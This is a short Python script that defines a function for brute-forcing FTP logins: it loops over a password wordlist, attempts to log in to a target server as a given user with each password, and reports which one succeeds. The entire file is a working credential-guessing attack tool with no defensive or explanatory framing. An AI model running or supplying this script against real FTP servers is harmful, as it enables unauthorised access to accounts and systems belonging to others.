from ftplib import FTP

def brute_force_ftp(target, username, wordlist):
    print(f"[FTP] Target: {target}, User: {username}")
    for pwd in open(wordlist):
        try:
            ftp = FTP(target)
            ftp.login(user=username, passwd=pwd.strip())
            print(f"[+] Success: {username}:{pwd.strip()}")
            return
        except:
            print(f"[-] Failed: {pwd.strip()}")
    print("[!] Done testing FTP.")